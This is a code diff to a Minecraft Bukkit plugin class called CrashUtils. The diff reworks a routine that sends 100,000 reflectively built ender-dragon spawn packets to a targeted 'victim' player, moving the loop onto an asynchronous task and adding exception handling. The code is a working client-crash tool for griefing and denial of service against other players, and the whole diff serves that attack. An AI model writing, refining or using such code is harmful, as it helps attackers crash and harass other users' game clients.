@@ -7,6 +7,7 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
 import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Collections;
 import java.util.List;
@@ -91,18 +92,49 @@ public class CrashUtils {
                 case ENTITY:
                     Location loc = victim.getLocation();
 
-                    for (int i = 0; i < 100000; i++) {
-                        Object craftWorld = craftWorldClass.cast(loc.getWorld());
-                        Object getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
+                    Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
+                        for (int i = 0; i < 100000; i++) {
+                            Object craftWorld = craftWorldClass.cast(loc.getWorld());
+                            Object getHandle;
+                            try {
+                                getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
+                            } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
+                                throw new RuntimeException(e);
+                            }
 
-                        Constructor<?> enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
-                        Object dragonEntity = enderDragonConstructor.newInstance(getHandle);
+                            Constructor<?> enderDragonConstructor;
+                            try {
+                                enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
+                            } catch (NoSuchMethodException e) {
+                                throw new RuntimeException(e);
+                            }
+                            Object dragonEntity;
+                            try {
+                                dragonEntity = enderDragonConstructor.newInstance(getHandle);
+                            } catch (InstantiationException | InvocationTargetException | IllegalAccessException e) {
+                                throw new RuntimeException(e);
+                            }
 
-                        Constructor<?> enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
-                        Object enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);
+                            Constructor<?> enderDragonPacketConstructor;
+                            try {
+                                enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
+                            } catch (NoSuchMethodException e) {
+                                throw new RuntimeException(e);
+                            }
+                            Object enderDragonPacket;
+                            try {
+                                enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);
+                            } catch (InstantiationException | IllegalAccessException | InvocationTargetException e) {
+                                throw new RuntimeException(e);
+                            }
 
-                        sendPacket(victim, enderDragonPacket);
-                    }
+                            try {
+                                sendPacket(victim, enderDragonPacket);
+                            } catch (Exception e) {
+                                throw new RuntimeException(e);
+                            }
+                        }
+                    });
                     break;
             }
 
